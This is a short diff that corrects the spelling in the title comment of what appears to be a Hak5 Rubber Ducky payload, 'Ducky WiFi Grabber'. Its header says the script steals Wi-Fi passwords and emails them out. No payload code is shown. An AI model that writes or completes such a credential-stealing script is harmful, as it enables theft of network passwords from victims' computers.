@@ -1,4 +1,4 @@
-REM Title:         Ducky WiFi Graber
+REM Title:         Ducky WiFi Grabber
 REM Description:   Steals wifi passwords and sends them to your outlook email
 REM Author:        Zero_Sploit
 REM Props:         Hak5 Team
